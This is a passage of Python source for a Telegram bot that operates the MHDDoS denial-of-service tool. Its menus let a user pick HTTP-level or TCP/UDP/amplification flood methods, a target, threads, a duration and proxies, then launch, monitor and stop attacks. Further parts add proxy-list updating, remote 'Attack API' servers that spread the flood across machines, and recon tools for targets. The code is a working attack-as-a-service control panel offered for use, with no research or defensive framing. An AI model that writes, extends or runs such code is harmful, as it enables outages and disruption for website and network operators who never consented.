🎯 Target: {session.config.target}
⚡ Method: {session.config.method}
⏱️ Elapsed: {elapsed}s
⏳ Remaining: {remaining}s
📈 Progress: [{progress_bar}] {progress}%
📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
"""
            await update.message.reply_text(
                status_text,
                reply_markup=self.get_stop_keyboard()
            )
        except Exception as e:
            logger.error(f"Error in status_command: {e}\n{traceback.format_exc()}")
            await self.safe_reply(update.message, f"⚠️ Error getting status: {str(e)}")
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /stop command."""
        try:
            user_id = update.effective_user.id
            
            if user_id in self.active_sessions:
                session = self.active_sessions[user_id]
                session.event.clear()
                session.is_running = False
                if session.monitor_task and not session.monitor_task.done():
                    session.monitor_task.cancel()
                del self.active_sessions[user_id]
                await update.message.reply_text("🛑 Attack stopped.", reply_markup=self.get_main_menu_keyboard())
            else:
                await update.message.reply_text("📭 No active attacks to stop.", reply_markup=self.get_main_menu_keyboard())
        except Exception as e:
            logger.error(f"Error in stop_command: {e}\n{traceback.format_exc()}")
            await self.safe_reply(update.message, f"⚠️ Error stopping attack: {str(e)}")
    
    # Callback query handlers
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle button callbacks."""
        query = update.callback_query
        user_id = update.effective_user.id
        
        try:
            await query.answer()
        except TelegramError:
            pass  # Answer may have expired
        
        if not self.is_authorized(user_id):
            await self.safe_edit_message(query, "⛔ You are not authorized to use this bot.")
            return ConversationHandler.END
        
        config = self.get_user_config(user_id)
        data = query.data
        
        try:
            return await self._process_callback(query, user_id, config, data)
        except Exception as e:
            logger.error(f"Error in button_callback: {e}\n{traceback.format_exc()}")
            await self.safe_edit_message(
                query,
                f"⚠️ Error: {str(e)}\n\nReturning to main menu...",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
    
    async def _process_callback(self, query, user_id: int, config: AttackConfig, data: str) -> int:
        """Process callback data. Separated for better error handling."""
        
        # Main menu selections
        if data == "layer_7":
            config.is_layer7 = True
            await self.safe_edit_message(
                query,
                "🔥 Select Layer 7 Method:",
                reply_markup=self.get_layer7_methods_keyboard()
            )
            return ConversationState.SELECT_METHOD.value
        
        elif data == "layer_4":
            config.is_layer7 = False
            await self.safe_edit_message(
                query,
                "💥 Select Layer 4 Method:",
                reply_markup=self.get_layer4_methods_keyboard()
            )
            return ConversationState.SELECT_METHOD.value
        
        elif data == "tools":
            await self.safe_edit_message(
                query,
                "🔧 Select a tool:",
                reply_markup=self.get_tools_keyboard()
            )
            return ConversationState.TOOLS_MENU.value
        
        elif data == "proxy_manager":
            stats = get_proxy_stats()
            from datetime import datetime
            last_update = datetime.fromtimestamp(stats.last_updated).strftime('%Y-%m-%d %H:%M') if stats.last_updated else "Never"
            
            stats_text = f"""
🔄 Proxy Manager
----------------
📊 Current Proxy Counts:
• HTTP: {stats.http_count:,}
• SOCKS4: {stats.socks4_count:,}
• SOCKS5: {stats.socks5_count:,}
• Total: {stats.http_count + stats.socks4_count + stats.socks5_count:,}

🕐 Last Updated: {last_update}

Select an option to manage proxies:
"""
            await self.safe_edit_message(
                query,
                stats_text,
                reply_markup=self.get_proxy_manager_keyboard()
            )
            return ConversationState.PROXY_MANAGEMENT.value
        
        elif data == "proxy_stats":
            stats = get_proxy_stats()
            from datetime import datetime
            last_update = datetime.fromtimestamp(stats.last_updated).strftime('%Y-%m-%d %H:%M') if stats.last_updated else "Never"
            
            stats_text = f"""
📊 Proxy Statistics
-------------------
• HTTP Proxies: {stats.http_count:,}
• SOCKS4 Proxies: {stats.socks4_count:,}
• SOCKS5 Proxies: {stats.socks5_count:,}
• Total Proxies: {stats.http_count + stats.socks4_count + stats.socks5_count:,}

🕐 Last Updated: {last_update}
"""
            await self.safe_edit_message(
                query,
                stats_text,
                reply_markup=self.get_proxy_manager_keyboard()
            )
            return ConversationState.PROXY_MANAGEMENT.value
        
        elif data.startswith("proxy_update_"):
            proxy_type_str = data.replace("proxy_update_", "")
            
            if proxy_type_str == "all":
                await self.safe_edit_message(query, "🔄 Updating all proxy lists... This may take a few minutes.")
                
                results = []
                for ptype in [1, 4, 5]:
                    count, msg = await update_proxy_list(ptype)
                    results.append(msg)
                
                result_text = "📋 Proxy Update Results:\n\n" + "\n".join(results)
                await self.safe_edit_message(
                    query,
                    result_text,
                    reply_markup=self.get_proxy_manager_keyboard()
                )
            else:
                proxy_type = int(proxy_type_str)
                type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
                
                await self.safe_edit_message(query, f"🔄 Updating {type_name} proxies... This may take a minute.")
                
                count, msg = await update_proxy_list(proxy_type)
                
                await self.safe_edit_message(
                    query,
                    f"📋 Update Result:\n\n{msg}",
                    reply_markup=self.get_proxy_manager_keyboard()
                )
            
            return ConversationState.PROXY_MANAGEMENT.value
        
        # API Management handlers
        elif data == "api_manager":
            enabled_count = len(self.get_enabled_apis())
            total_count = len(self.attack_apis)
            
            api_text = f"""
🌐 API Manager
--------------
📊 Registered APIs: {total_count}
✅ Enabled: {enabled_count}

Manage remote Attack API servers to distribute
attack load across multiple instances.

Select an option:
"""
            await self.safe_edit_message(
                query,
                api_text,
                reply_markup=self.get_api_manager_keyboard()
            )
            return ConversationState.API_MANAGEMENT.value
        
        elif data == "api_list":
            if not self.attack_apis:
                api_text = """
🌐 API List
-----------
📭 No APIs registered.

Use ➕ Add API to register a new Attack API server.
"""
            else:
                api_lines = []
                for api in self.attack_apis:
                    status = "✅" if api.enabled else "⏸️"
                    api_lines.append(f"{status} {api.name}: {api.url}")
                
                api_text = f"""
🌐 API List ({len(self.attack_apis)} total)
-----------
{chr(10).join(api_lines)}

Tap an API name below to manage it:
"""
            
            # Create keyboard with API buttons
            keyboard = []
            for api in self.attack_apis:
                status = "✅" if api.enabled else "⏸️"
                keyboard.append([
                    InlineKeyboardButton(f"{status} {api.name}", callback_data=f"api_detail_{api.name}")
                ])
            
            keyboard.append([InlineKeyboardButton("➕ Add API", callback_data="api_add")])
            keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="api_manager")])
            
            await self.safe_edit_message(
                query,
                api_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationState.API_MANAGEMENT.value
        
        elif data == "api_add":
            self.user_state_context[user_id] = "api_add_name"
            self.user_api_context[user_id] = ""
            
            await self.safe_edit_message(
                query,
                """
➕ Add New API
--------------
Step 1/3: Enter a name for this API (e.g., "server1"):
"""
            )
            return ConversationState.API_ADD.value
        
        elif data.startswith("api_detail_"):
            api_name = data.replace("api_detail_", "")
            api = None
            for a in self.attack_apis:
                if a.name == api_name:
                    api = a
                    break
            
            if not api:
                await self.safe_edit_message(
                    query,
                    f"⚠️ API '{api_name}' not found.",
                    reply_markup=self.get_api_manager_keyboard()
                )
                return ConversationState.API_MANAGEMENT.value
            
            # Check health
            is_healthy, health_info = check_api_health(api)
            api.is_healthy = is_healthy
            api.last_check = time()
            
            health_status = "🟢 Healthy" if is_healthy else f"🔴 Unhealthy"
            if is_healthy:
                api.max_threads = health_info.get("max_threads", 0)
                health_details = f"""
• Active Attacks: {health_info.get('active_attacks', 0)}
• Max Threads: {health_info.get('max_threads', 0)}
• Current Threads: {health_info.get('current_threads', 0)}"""
            else:
                health_details = f"\n• Error: {health_info.get('error', 'Unknown')}"
            
            status = "✅ Enabled" if api.enabled else "⏸️ Disabled"
            
            detail_text = f"""
🌐 API: {api.name}
------------------
📍 URL: {api.url}
🔑 API Key: {'***' + api.api_key[-4:] if api.api_key else 'None'}
📊 Status: {status}
🏥 Health: {health_status}
{health_details}
"""
            await self.safe_edit_message(
                query,
                detail_text,
                reply_markup=self.get_api_detail_keyboard(api_name, api.enabled)
            )
            return ConversationState.API_MANAGEMENT.value
        
        elif data.startswith("api_toggle_"):
            api_name = data.replace("api_toggle_", "")
            new_status = self.toggle_api(api_name)
            
            if new_status is not None:
                status_text = "enabled" if new_status else "disabled"
                await self.safe_edit_message(
                    query,
                    f"✅ API '{api_name}' has been {status_text}.",
                    reply_markup=self.get_api_manager_keyboard()
                )
            else:
                await self.safe_edit_message(
                    query,
                    f"⚠️ API '{api_name}' not found.",
                    reply_markup=self.get_api_manager_keyboard()
                )
            return ConversationState.API_MANAGEMENT.value
        
        elif data.startswith("api_remove_"):
            api_name = data.replace("api_remove_", "")
            if self.remove_api(api_name):
                await self.safe_edit_message(
                    query,
                    f"🗑️ API '{api_name}' has been removed.",
                    reply_markup=self.get_api_manager_keyboard()
                )
            else:
                await self.safe_edit_message(
                    query,
                    f"⚠️ API '{api_name}' not found.",
                    reply_markup=self.get_api_manager_keyboard()
                )
            return ConversationState.API_MANAGEMENT.value
        
        elif data.startswith("api_check_"):
            api_name = data.replace("api_check_", "")
            
            if api_name == "all":
                await self.safe_edit_message(query, "🔍 Checking all APIs...")
                
                results = []
                for api in self.attack_apis:
                    is_healthy, info = check_api_health(api)
                    api.is_healthy = is_healthy
                    api.last_check = time()
                    
                    status = "🟢" if is_healthy else "🔴"
                    results.append(f"{status} {api.name}: {'OK' if is_healthy else info.get('error', 'Error')}")
                
                result_text = "🔍 API Health Check Results:\n\n" + "\n".join(results) if results else "No APIs registered."
                
                await self.safe_edit_message(
                    query,
                    result_text,
                    reply_markup=self.get_api_manager_keyboard()
                )
            else:
                api = None
                for a in self.attack_apis:
                    if a.name == api_name:
                        api = a
                        break
                
                if api:
                    await self.safe_edit_message(query, f"🔍 Checking {api_name}...")
                    is_healthy, info = check_api_health(api)
                    api.is_healthy = is_healthy
                    api.last_check = time()
                    
                    status = "🟢 Healthy" if is_healthy else "🔴 Unhealthy"
                    details = f"Max Threads: {info.get('max_threads', 'N/A')}" if is_healthy else f"Error: {info.get('error', 'Unknown')}"
                    
                    await self.safe_edit_message(
                        query,
                        f"🔍 Health Check: {api_name}\n\n{status}\n{details}",
                        reply_markup=self.get_api_detail_keyboard(api_name, api.enabled)
                    )
                else:
                    await self.safe_edit_message(
                        query,
                        f"⚠️ API '{api_name}' not found.",
                        reply_markup=self.get_api_manager_keyboard()
                    )
            
            return ConversationState.API_MANAGEMENT.value
        
        elif data == "status" or data == "refresh_status":
            if user_id not in self.active_sessions or not self.active_sessions[user_id].is_running:
                await self.safe_edit_message(
                    query,
                    "📭 No active attacks.",
                    reply_markup=self.get_main_menu_keyboard()
                )
            else:
                session = self.active_sessions[user_id]
                elapsed = int(time() - session.start_time)
                remaining = max(0, session.config.duration - elapsed)
                progress = min(100, int((elapsed / session.config.duration) * 100))
                progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
                
                error_info = ""
                if session.error_count > 0:
                    error_info = f"\n⚠️ Errors: {session.error_count}"
                    if session.last_error:
                        error_info += f"\n📛 Last: {session.last_error[:50]}"
                
                status_text = f"""
📊 Attack Status:
-----------------
🎯 Target: {session.config.target}
⚡ Method: {session.config.method}
⏱️ Elapsed: {elapsed}s
⏳ Remaining: {remaining}s
📈 Progress: [{progress_bar}] {progress}%
📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
"""
                await self.safe_edit_message(
                    query,
                    status_text,
                    reply_markup=self.get_stop_keyboard()
                )
            return ConversationState.MAIN_MENU.value
        
        elif data == "help":
            help_text = f"""
📖 MHDDoS Bot Help:

🔥 Layer 7 Methods: HTTP-based attacks
• GET, POST, CFB, BYPASS, OVH, etc.

💥 Layer 4 Methods: TCP/UDP-based attacks
• TCP, UDP, SYN, DNS, NTP, etc.

🔧 Tools: Network utilities
• INFO, PING, CHECK, DSTAT, TSSRV

🔄 Proxy Manager: Update & manage proxies

⚙️ System Limits:
• Max Threads: {SYSTEM_MAX_THREADS}
• Current Active: {active_count()}

Use inline buttons to navigate and configure attacks.
"""
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]
            await self.safe_edit_message(
                query,
                help_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationState.MAIN_MENU.value
        
        elif data == "back_main":
            config.reset()
            self.user_state_context[user_id] = ""
            await self.safe_edit_message(
                query,
                "🏠 Main Menu - Select an option:",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
        
        # Method selection
        elif data.startswith("method_"):
            method = data.replace("method_", "")
            config.method = method
            self.user_state_context[user_id] = "enter_target"
            await self.safe_edit_message(
                query,
                f"⚡ Method: {method}\n\n📝 Enter target URL/IP:"
            )
            return ConversationState.ENTER_TARGET.value
        
        # Threads selection
        elif data.startswith("threads_"):
            value = data.replace("threads_", "")
            if value == "custom":
                self.user_state_context[user_id] = "enter_threads"
                await self.safe_edit_message(
                    query,
                    f"📝 Enter custom thread count:\n\n⚠️ System max: {SYSTEM_MAX_THREADS}"
                )
                return ConversationState.ENTER_THREADS.value
            else:
                thread_count = int(value)
                # Validate against system limit
                if thread_count > SYSTEM_MAX_THREADS:
                    await self.safe_edit_message(
                        query,
                        f"⚠️ {thread_count} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\nPlease select a lower value:",
                        reply_markup=self.get_threads_keyboard()
                    )
                    return ConversationState.ENTER_THREADS.value
                
                config.threads = thread_count
                await self.safe_edit_message(
                    query,
                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
                    reply_markup=self.get_duration_keyboard()
                )
                return ConversationState.ENTER_DURATION.value
        
        # Duration selection
        elif data.startswith("duration_"):
            value = data.replace("duration_", "")
            if value == "custom":
                self.user_state_context[user_id] = "enter_duration"
                await self.safe_edit_message(query, "📝 Enter custom duration (seconds):")
                return ConversationState.ENTER_DURATION.value
            else:
                config.duration = int(value)
                if config.is_layer7:
                    await self.safe_edit_message(
                        query,
                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC (Requests Per Connection):",
                        reply_markup=self.get_rpc_keyboard()
                    )
                    return ConversationState.ENTER_RPC.value
                else:
                    # Layer 4 doesn't need RPC, go to confirmation
                    # Validate config before showing confirmation
                    is_valid, error_msg = config.validate()
                    if not is_valid:
                        await self.safe_edit_message(
                            query,
                            f"⚠️ Configuration Error: {error_msg}\n\nReturning to main menu...",
                            reply_markup=self.get_main_menu_keyboard()
                        )
                        return ConversationState.MAIN_MENU.value
                    
                    await self.safe_edit_message(
                        query,
                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                        reply_markup=self.get_confirm_keyboard()
                    )
                    return ConversationState.CONFIRM_ATTACK.value
        
        # RPC selection
        elif data.startswith("rpc_"):
            value = data.replace("rpc_", "")
            if value == "custom":
                self.user_state_context[user_id] = "enter_rpc"
                await self.safe_edit_message(query, "📝 Enter custom RPC value:")
                return ConversationState.ENTER_RPC.value
            else:
                config.rpc = int(value)
                await self.safe_edit_message(
                    query,
                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
                    reply_markup=self.get_proxy_type_keyboard()
                )
                return ConversationState.SELECT_PROXY_TYPE.value
        
        # Proxy type selection (for attack configuration, not manager)
        elif data.startswith("proxy_") and not data.startswith("proxy_update_") and data not in ["proxy_manager", "proxy_stats"]:
            value = data.replace("proxy_", "")
            if value == "none":
                config.proxy_type = -1
            else:
                try:
                    config.proxy_type = int(value)
                except ValueError:
                    config.proxy_type = 0
            
            # Validate config before showing confirmation
            is_valid, error_msg = config.validate()
            if not is_valid:
                await self.safe_edit_message(
                    query,
                    f"⚠️ Configuration Error: {error_msg}\n\nReturning to main menu...",
                    reply_markup=self.get_main_menu_keyboard()
                )
                return ConversationState.MAIN_MENU.value
            
            await self.safe_edit_message(
                query,
                self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                reply_markup=self.get_confirm_keyboard()
            )
            return ConversationState.CONFIRM_ATTACK.value
        
        # Confirmation
        elif data == "confirm_start":
            # Validate config before starting
            is_valid, error_msg = config.validate()
            if not is_valid:
                await self.safe_edit_message(
                    query,
                    f"⚠️ Cannot start attack: {error_msg}",
                    reply_markup=self.get_main_menu_keyboard()
                )
                return ConversationState.MAIN_MENU.value
            
            await self.start_attack(query, user_id, config)
            return ConversationState.MAIN_MENU.value
        
        elif data == "confirm_cancel":
            config.reset()
            await self.safe_edit_message(
                query,
                "❌ Attack cancelled.\n\n🏠 Main Menu:",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
        
        # Stop attack
        elif data == "stop_attack":
            if user_id in self.active_sessions:
                session = self.active_sessions[user_id]
                session.event.clear()
                session.is_running = False
                if session.monitor_task and not session.monitor_task.done():
                    session.monitor_task.cancel()
                del self.active_sessions[user_id]
                await self.safe_edit_message(
                    query,
                    "🛑 Attack stopped.\n\n🏠 Main Menu:",
                    reply_markup=self.get_main_menu_keyboard()
                )
            else:
                await self.safe_edit_message(
                    query,
                    "📭 No active attacks.\n\n🏠 Main Menu:",
                    reply_markup=self.get_main_menu_keyboard()
                )
            return ConversationState.MAIN_MENU.value
        
        # Tools
        elif data.startswith("tool_"):
            tool = data.replace("tool_", "")
            self.user_tools_context[user_id] = tool
            self.user_state_context[user_id] = f"tool_{tool}"
            
            if tool == "dstat":
                await self.run_dstat(query)
                return ConversationState.TOOLS_MENU.value
            else:
                prompts = {
                    "info": "🌐 Enter IP address or domain:",
                    "ping": "📡 Enter IP address or domain:",
                    "check": "✔️ Enter URL to check (include http:// or https://):",
                    "tssrv": "🎮 Enter domain for TeamSpeak SRV lookup:",
                }
                await self.safe_edit_message(query, prompts.get(tool, "📝 Enter target:"))
                return ConversationState.TOOLS_INPUT.value
        
        # Unknown callback - return to main menu
        logger.warning(f"Unknown callback data: {data}")
        await self.safe_edit_message(
            query,
            "⚠️ Unknown command. Returning to main menu...",
            reply_markup=self.get_main_menu_keyboard()
        )
        return ConversationState.MAIN_MENU.value
    
    async def handle_text_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle text input from user."""
        user_id = update.effective_user.id
        config = self.get_user_config(user_id)
        text = update.message.text.strip()
        
        try:
            return await self._process_text_input(update, user_id, config, text)
        except Exception as e:
            logger.error(f"Error in handle_text_input: {e}\n{traceback.format_exc()}")
            await self.safe_reply(
                update.message,
                f"⚠️ Error processing input: {str(e)}\n\nReturning to main menu...",
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
    
    async def _process_text_input(self, update: Update, user_id: int, config: AttackConfig, text: str) -> int:
        """Process text input. Separated for better error handling."""
        state_context = self.user_state_context.get(user_id, "")
        
        # Handle API addition states
        if state_context == "api_add_name":
            # Validate API name
            api_name = text.strip().lower().replace(" ", "_")
            if not api_name:
                await self.safe_reply(update.message, "⚠️ Invalid name. Please enter a valid API name:")
                return ConversationState.API_ADD.value
            
            # Check for existing API with same name
            for api in self.attack_apis:
                if api.name == api_name:
                    await self.safe_reply(
                        update.message,
                        f"⚠️ API '{api_name}' already exists. Please choose a different name:"
                    )
                    return ConversationState.API_ADD.value
            
            self.user_api_context[user_id] = api_name
            self.user_state_context[user_id] = "api_add_url"
            
            await self.safe_reply(
                update.message,
                f"""
✓ Name: {api_name}

Step 2/3: Enter the API URL (e.g., http://server:5000):
"""
            )
            return ConversationState.API_ADD.value
        
        elif state_context == "api_add_url":
            # Validate URL
            url = text.strip()
            if not url.startswith("http"):
                url = "http://" + url
            
            # Remove trailing slash
            url = url.rstrip("/")
            
            # Store URL temporarily
            api_name = self.user_api_context.get(user_id, "")
            self.user_api_context[user_id] = f"{api_name}|{url}"
            self.user_state_context[user_id] = "api_add_key"
            
            await self.safe_reply(
                update.message,
                f"""
✓ Name: {api_name}
✓ URL: {url}

Step 3/3: Enter API key (or type 'none' for no key):
"""
            )
            return ConversationState.API_ADD.value
        
        elif state_context == "api_add_key":
            # Finalize API addition
            api_key = text.strip()
            if api_key.lower() == "none":
                api_key = ""
            
            context_data = self.user_api_context.get(user_id, "")
            if "|" not in context_data:
                await self.safe_reply(
                    update.message,
                    "⚠️ Error: Missing API data. Please start over.",
                    reply_markup=self.get_api_manager_keyboard()
                )
                self.user_state_context[user_id] = ""
                self.user_api_context[user_id] = ""
                return ConversationState.API_MANAGEMENT.value
            
            api_name, api_url = context_data.split("|", 1)
            
            # Create and add API
            new_api = AttackAPI(
                name=api_name,
                url=api_url,
                api_key=api_key,
                enabled=True
            )
            
            # Check health before adding
            is_healthy, health_info = check_api_health(new_api)
            new_api.is_healthy = is_healthy
            new_api.last_check = time()
            
            if self.add_api(new_api):
                health_status = "🟢 Healthy" if is_healthy else f"🔴 Unhealthy ({health_info.get('error', 'Unknown')})"
                
                await self.safe_reply(
                    update.message,
                    f"""
✅ API Added Successfully!
------------------------
📛 Name: {api_name}
📍 URL: {api_url}
🔑 Key: {'Set' if api_key else 'None'}
🏥 Status: {health_status}
""",
                    reply_markup=self.get_api_manager_keyboard()
                )
            else:
                await self.safe_reply(
                    update.message,
                    f"⚠️ Failed to add API '{api_name}'. It may already exist.",
                    reply_markup=self.get_api_manager_keyboard()
                )
            
            # Clear context
            self.user_state_context[user_id] = ""
            self.user_api_context[user_id] = ""
            return ConversationState.API_MANAGEMENT.value
        
        # Handle based on explicit state context
        elif state_context == "enter_target" or (not config.target and config.method):
            # Entering target
            target = text
            
            # For Layer 7, we need HTTP URLs
            # For Layer 4, we can accept plain IP:port or hostname:port
            if config.is_layer7 and not target.startswith("http"):
                target = "http://" + target
            elif not config.is_layer7 and not target.startswith("http"):
                # For Layer 4, add http:// prefix just for URL parsing purposes
                target = "http://" + target
            
            try:
                url = URL(target)
                config.target = url.host
                config.port = url.port or 80
                self.user_state_context[user_id] = ""  # Clear context
                
                if config.is_layer7:
                    # Try to resolve hostname
                    if config.method != "TOR":
                        try:
                            gethostbyname(url.host)
                        except Exception as e:
                            await self.safe_reply(
                                update.message,
                                f"⚠️ Cannot resolve hostname: {str(e)}\n\n📝 Please enter a valid target:"
                            )
                            return ConversationState.ENTER_TARGET.value
                    
                    await self.safe_reply(
                        update.message,
                        f"🎯 Target: {config.target}\n\n{self.get_threads_prompt()}",
                        reply_markup=self.get_threads_keyboard()
                    )
                    return ConversationState.ENTER_THREADS.value
                else:
                    # Layer 4 - ask for port if not in URL
                    if not url.port:
                        self.user_state_context[user_id] = "enter_port"
                        await self.safe_reply(
                            update.message,
                            f"🎯 Target: {config.target}\n\n🔌 Enter port (1-65535):"
                        )
                        return ConversationState.ENTER_PORT.value
                    else:
                        await self.safe_reply(
                            update.message,
                            f"🎯 Target: {config.target}:{config.port}\n\n{self.get_threads_prompt()}",
                            reply_markup=self.get_threads_keyboard()
                        )
                        return ConversationState.ENTER_THREADS.value
                        
            except Exception as e:
                await self.safe_reply(
                    update.message,
                    f"⚠️ Invalid target format: {str(e)}\n\n📝 Please enter a valid URL or IP:"
                )
                return ConversationState.ENTER_TARGET.value
        
        elif state_context == "enter_port" or (config.target and config.port == 80 and not config.is_layer7):
            # Entering port for Layer 4
            try:
                port = int(text)
                if 1 <= port <= 65535:
                    config.port = port
                    self.user_state_context[user_id] = ""
                    await self.safe_reply(
                        update.message,
                        f"🔌 Port: {config.port}\n\n{self.get_threads_prompt()}",
                        reply_markup=self.get_threads_keyboard()
                    )
                    return ConversationState.ENTER_THREADS.value
                else:
                    await self.safe_reply(update.message, "⚠️ Port must be between 1 and 65535. Enter port:")
                    return ConversationState.ENTER_PORT.value
            except ValueError:
                await self.safe_reply(update.message, "⚠️ Invalid port. Enter a number between 1-65535:")
                return ConversationState.ENTER_PORT.value
        
        elif state_context == "enter_threads":
            # Custom threads input
            try:
                value = int(text)
                if value < 1:
                    await self.safe_reply(update.message, "⚠️ Thread count must be at least 1. Enter thread count:")
                    return ConversationState.ENTER_THREADS.value
                if value > SYSTEM_MAX_THREADS:
                    await self.safe_reply(
                        update.message,
                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
                    )
                    return ConversationState.ENTER_THREADS.value
                
                config.threads = value
                self.user_state_context[user_id] = ""
                await self.safe_reply(
                    update.message,
                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
                    reply_markup=self.get_duration_keyboard()
                )
                return ConversationState.ENTER_DURATION.value
            except ValueError:
                await self.safe_reply(update.message, "⚠️ Invalid number. Enter thread count:")
                return ConversationState.ENTER_THREADS.value
        
        elif state_context == "enter_duration":
            # Custom duration input
            try:
                value = int(text)
                if value < 1:
                    await self.safe_reply(update.message, "⚠️ Duration must be at least 1 second. Enter duration:")
                    return ConversationState.ENTER_DURATION.value
                
                config.duration = value
                self.user_state_context[user_id] = ""
                
                if config.is_layer7:
                    await self.safe_reply(
                        update.message,
                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC:",
                        reply_markup=self.get_rpc_keyboard()
                    )
                    return ConversationState.ENTER_RPC.value
                else:
                    # Validate before confirmation
                    is_valid, error_msg = config.validate()
                    if not is_valid:
                        await self.safe_reply(
                            update.message,
                            f"⚠️ Configuration Error: {error_msg}",
                            reply_markup=self.get_main_menu_keyboard()
                        )
                        return ConversationState.MAIN_MENU.value
                    
                    await self.safe_reply(
                        update.message,
                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                        reply_markup=self.get_confirm_keyboard()
                    )
                    return ConversationState.CONFIRM_ATTACK.value
            except ValueError:
                await self.safe_reply(update.message, "⚠️ Invalid number. Enter duration in seconds:")
                return ConversationState.ENTER_DURATION.value
        
        elif state_context == "enter_rpc":
            # Custom RPC input
            try:
                value = int(text)
                if value < 1:
                    await self.safe_reply(update.message, "⚠️ RPC must be at least 1. Enter RPC value:")
                    return ConversationState.ENTER_RPC.value
                
                config.rpc = value
                self.user_state_context[user_id] = ""
                await self.safe_reply(
                    update.message,
                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
                    reply_markup=self.get_proxy_type_keyboard()
                )
                return ConversationState.SELECT_PROXY_TYPE.value
            except ValueError:
                await self.safe_reply(update.message, "⚠️ Invalid number. Enter RPC value:")
                return ConversationState.ENTER_RPC.value
        
        # Fallback for numeric input based on config state (backward compatibility)
        elif text.isdigit() and config.target:
            value = int(text)
            
            # Could be threads, duration, or RPC - determine from defaults
            if config.threads == 100:  # Default, likely entering custom threads
                if value > SYSTEM_MAX_THREADS:
                    await self.safe_reply(
                        update.message,
                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
                    )
                    return ConversationState.ENTER_THREADS.value
                
                config.threads = value
                await self.safe_reply(
                    update.message,
                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
                    reply_markup=self.get_duration_keyboard()
                )
                return ConversationState.ENTER_DURATION.value
            elif config.duration == 60:  # Default, likely entering custom duration
                config.duration = value
                if config.is_layer7:
                    await self.safe_reply(
                        update.message,
                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC:",
                        reply_markup=self.get_rpc_keyboard()
                    )
                    return ConversationState.ENTER_RPC.value
                else:
                    await self.safe_reply(
                        update.message,
                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                        reply_markup=self.get_confirm_keyboard()
                    )
                    return ConversationState.CONFIRM_ATTACK.value
            elif config.is_layer7 and config.rpc == 1:  # Default, likely entering custom RPC
                config.rpc = value
                await self.safe_reply(
                    update.message,
                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
                    reply_markup=self.get_proxy_type_keyboard()
                )
                return ConversationState.SELECT_PROXY_TYPE.value
        
        # Unknown input - prompt user
        await self.safe_reply(
            update.message,
            "❓ I didn't understand that. Please use the menu buttons.",
            reply_markup=self.get_main_menu_keyboard()
        )
        return ConversationState.MAIN_MENU.value
    
    async def handle_tools_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle tools input from user."""
        user_id = update.effective_user.id
        tool = self.user_tools_context.get(user_id, "")
        target = update.message.text.strip()
        
        if not target:
            await self.safe_reply(
                update.message,
                "⚠️ Invalid input. Please try again.",
                reply_markup=self.get_tools_keyboard()
            )
            return ConversationState.TOOLS_MENU.value
        
        try:
            return await self._process_tools_input(update, tool, target)
        except Exception as e:
            logger.error(f"Error in handle_tools_input: {e}\n{traceback.format_exc()}")
            await self.safe_reply(
                update.message,
                f"⚠️ Tool error: {str(e)}",
                reply_markup=self.get_tools_keyboard()
            )
            return ConversationState.TOOLS_MENU.value
    
    async def _process_tools_input(self, update: Update, tool: str, target: str) -> int:
        """Process tools input. Separated for better error handling."""
        # Clean up target
        domain = target.replace('https://', '').replace('http://', '')
        if "/" in domain:
            domain = domain.split("/")[0]
        
        if tool == "info":
            await self.safe_reply(update.message, "🔍 Fetching information...")
            try:
                info = ToolsConsole.info(domain)
                if info.get("success", True):
                    result = f"""
🌐 IP Information for {domain}:
-----------------------------
🌍 Country: {info.get('country', 'N/A')}
🏙️ City: {info.get('city', 'N/A')}
📍 Region: {info.get('region', 'N/A')}
🏢 ISP: {info.get('isp', 'N/A')}
🏛️ Org: {info.get('org', 'N/A')}
"""
                else:
                    result = f"⚠️ Failed to get information for {domain}"
            except Exception as e:
                result = f"⚠️ Info lookup failed: {str(e)}"
            
            await self.safe_reply(
                update.message,
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "ping":
            await self.safe_reply(update.message, "📡 Pinging...")
            try:
                r = icmp_ping(domain, count=5, interval=0.2)
                status_emoji = "🟢" if r.is_alive else "🔴"
                result = f"""
📡 Ping Results for {domain}:
---------------------------
🌐 Address: {r.address}
⏱️ Ping: {r.avg_rtt:.2f}ms
📦 Packets: {r.packets_received}/{r.packets_sent}
{status_emoji} Status: {"ONLINE" if r.is_alive else "OFFLINE"}
"""
